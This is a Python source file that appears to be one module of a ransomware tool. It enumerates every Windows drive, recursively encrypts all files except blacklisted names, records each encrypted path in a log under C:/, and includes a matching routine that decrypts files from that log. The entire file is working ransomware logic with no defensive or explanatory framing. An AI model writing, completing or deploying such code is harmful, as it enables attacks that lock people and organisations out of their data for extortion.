from cryption import encrypt, decrypt
from config import *
import string
import os

def iterateDrives():
    drives = ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:' % d)]
    drives = [d+'/' for d in drives]
    return drives

def encryptDrive(key,path):
    for subdir, dirs, files in os.walk(path, topdown=True):
        dirs[:] = [d for d in dirs if d not in names_blacklist]
        for file in files:
            pathjoin=os.path.join(subdir, file)
            
            try:
                if not any(name in pathjoin for name in names_blacklist):
                    
                    encrypt(key,pathjoin)
                    with open(f"C:/{dir_name}/{encrypted_files_name}",'a') as ef:
                        ef.write(f"{pathjoin}\n")
                
            except Exception as e:
                print(e)
                pass

def decryptDrive(key):
    with open(f"C:/{dir_name}/{encrypted_files_name}") as ef:
        files=ef.readlines()
    
    for file in files:
        file=file.replace("\n","")
        try:
            decrypt(key,file)
        
        except Exception as e:
            print(e)